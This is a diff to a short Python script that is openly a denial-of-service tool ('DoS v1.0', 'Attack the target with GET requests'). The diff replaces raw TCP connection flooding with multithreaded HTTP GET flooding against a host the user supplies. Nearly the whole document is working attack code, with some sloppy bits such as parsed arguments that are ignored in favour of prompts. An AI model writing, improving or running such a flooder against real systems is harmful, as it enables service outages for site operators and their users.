@@ -1,28 +1,34 @@
 ﻿#!/usr/bin/env python
 # -*- encoding: utf-8 -*-
-import socket
-import time
+import argparse, urllib.request, time
 from threading import Thread
 
-print('DoS v1.0\n')
-host = input('Host: ')
-port = int(input('Port: '))
-threads = int(input('Number of Threads: '))
-t = int(input('Connection Time: '))
+host, threads = [None , 0]
 
-def connect(i):
+def main():
+	parser = argparse.ArgumentParser(description='Attack the target with GET requests')
+	parser.add_argument('host', help='The target host')
+	parser.add_argument('threads', type=int, help='Number of attack threads')
+	parsed = parser.parse_args()
+	host = input('Host: ')
+	threads = int(input('Number of Threads: '))
 	try:
-		print('Thread #%d: Attacking...' % i)
-		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		sock.connect((host,port))
-		time.sleep(t)
-		sock.close()
+		attack(host, threads)
+	except:
+		print('Cannot create a new thread...')
+
+def connect(host):
+	try:
+		response = urllib.request.urlopen('http://%s' % (host)).read()
 	except:
 		print('Cannot connect to %s...' % host)
-def attack():
-	print('\nStarting DoS attack...\n')
-	for i in range(threads):
-		t = Thread(target=connect, args=(i,))
-		t.start()
 
-attack()
+def attack(host, threads):
+	print('\nATTACKING...\n')
+	for i in range(threads):
+		t = Thread(target=connect, args=(host,))
+		print('Thread #%d: Attacking...' % i)
+		t.start()
+	
+if __name__ == '__main__':
+	main()
